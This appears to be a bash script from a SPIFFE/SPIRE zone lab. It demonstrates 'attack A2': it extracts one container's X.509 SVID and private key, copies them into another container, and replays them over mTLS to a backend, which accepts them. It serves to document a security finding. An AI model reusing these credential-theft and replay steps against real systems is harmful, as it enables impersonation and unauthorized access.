#!/usr/bin/env bash
#
# FINDING (attack A2): an X.509 SVID is a bearer credential. A stolen SVID still
# works. The identity layer does not stop it.
#
# The demo copies the zone-b-gateway SVID material into a DIFFERENT container.
# The donor is zone-c-gateway. It sits on zone-b, so it has a route to the
# zone-b backend, but it holds another identity (zone-c/gateway). The demo
# presents the stolen zone-b/gateway SVID to the zone-b backend. The backend
# accepts it and answers HTTP 200. This is a FINDING, not a pass or a fail.
#
# The demo uses openssl s_client to present the stolen client certificate. It
# does not disable any peer validation. The backend still verifies the client
# chain and the client SAN. The point is exactly that the stolen SVID passes
# both checks, because a bearer credential works for whoever holds it.
#
# Mitigations (stated, not enforced by identity): memory-only private keys and a
# short SVID TTL (5m here). They reduce the theft window. They do not remove the
# bearer property.
#
# The demo restores state with a trap. It deletes every copy of the stolen key.

set -euo pipefail
cd "$(dirname "$0")/.."

COMPOSE="${COMPOSE:-docker compose}"

VICTIM_SERVICE="zone-b-gateway"          # the SVID we steal
DONOR_SERVICE="zone-c-gateway"           # a different container on zone-b
BACKEND_ADDR="10.20.0.50:9001"           # the zone-b backend Envoy
VICTIM_ID="spiffe://lab.local/zone-b/gateway"
EXPECTED_BODY="zone-lab backend zone-b OK"

HOST_TMP="tmp/bearer"
AGENT_SOCKET="/run/spire/agent.sock"

log() { printf '%s\n' "$*"; }
dc() { ${COMPOSE} "$@"; }

cleanup() {
  rm -rf "${HOST_TMP}" 2>/dev/null || true
  dc exec -T "${DONOR_SERVICE}" rm -rf /tmp/stolen 2>/dev/null || true
  dc exec -T "${VICTIM_SERVICE}" rm -rf /tmp/victim-svid 2>/dev/null || true
}
trap cleanup EXIT

main() {
  log "FINDING (attack A2): an X.509 SVID is a bearer credential."
  log "The demo steals the ${VICTIM_ID} SVID and reuses it from another host."
  log ""

  # The victim container writes its own SVID to files.
  dc exec -T "${VICTIM_SERVICE}" bash -c '
    set -e
    rm -rf /tmp/victim-svid && mkdir -p /tmp/victim-svid
    spire-agent api fetch x509 -socketPath '"${AGENT_SOCKET}"' -write /tmp/victim-svid >/dev/null
  '

  # Copy the material to the host (gitignored tmp), then into the donor. Keep
  # the private key mode at 0600 on the host copy.
  rm -rf "${HOST_TMP}" && mkdir -p "${HOST_TMP}"
  dc cp "${VICTIM_SERVICE}:/tmp/victim-svid/svid.0.pem"   "${HOST_TMP}/svid.0.pem"   >/dev/null
  dc cp "${VICTIM_SERVICE}:/tmp/victim-svid/svid.0.key"   "${HOST_TMP}/svid.0.key"   >/dev/null
  dc cp "${VICTIM_SERVICE}:/tmp/victim-svid/bundle.0.pem" "${HOST_TMP}/bundle.0.pem" >/dev/null
  chmod 0600 "${HOST_TMP}/svid.0.key"

  dc exec -T "${DONOR_SERVICE}" bash -c 'rm -rf /tmp/stolen && mkdir -p /tmp/stolen'
  dc cp "${HOST_TMP}/svid.0.pem"   "${DONOR_SERVICE}:/tmp/stolen/svid.0.pem"   >/dev/null
  dc cp "${HOST_TMP}/svid.0.key"   "${DONOR_SERVICE}:/tmp/stolen/svid.0.key"   >/dev/null
  dc cp "${HOST_TMP}/bundle.0.pem" "${DONOR_SERVICE}:/tmp/stolen/bundle.0.pem" >/dev/null

  # Verify the copy really is the victim SVID, from inside the donor container.
  local san
  san="$(dc exec -T "${DONOR_SERVICE}" \
    openssl x509 -in /tmp/stolen/svid.0.pem -noout -ext subjectAltName \
    | tr -d '[:space:]')"
  if ! grep -qF "URI:${VICTIM_ID}" <<<"${san}"; then
    log "ERROR: the copied certificate is not the ${VICTIM_ID} SVID."
    log "  copied SAN: ${san}"
    return 1
  fi
  log "the donor ${DONOR_SERVICE} now holds the stolen SVID: ${san}"
  log ""

  # Present the stolen client certificate to the zone-b backend. openssl
  # s_client completes the mTLS handshake and sends one HTTP request.
  local reply
  reply="$(dc exec -T "${DONOR_SERVICE}" bash -c '
    printf "GET /?bearer=1 HTTP/1.1\r\nHost: backend\r\nConnection: close\r\n\r\n" | \
    openssl s_client -connect '"${BACKEND_ADDR}"' -quiet \
      -cert /tmp/stolen/svid.0.pem -key /tmp/stolen/svid.0.key \
      -CAfile /tmp/stolen/bundle.0.pem 2>/dev/null
  ' || true)"

  log "backend reply through the stolen SVID:"
  log "${reply}" | tail -n 4
  log ""

  if grep -qF "${EXPECTED_BODY}" <<<"${reply}"; then
    log "FINDING CONFIRMED: the backend ACCEPTED the stolen SVID (HTTP 200 body)."
    log "An X.509 SVID is a bearer credential. The identity layer does not stop reuse."
    log "Mitigations: memory-only private keys, and a short SVID TTL (5m)."
    log "They shrink the theft window. They do not remove the bearer property."
    return 0
  fi

  log "UNEXPECTED: the backend did not return the zone-b body."
  log "  This demo expects ACCEPTED. Investigate the lab state."
  return 1
}

main "$@"
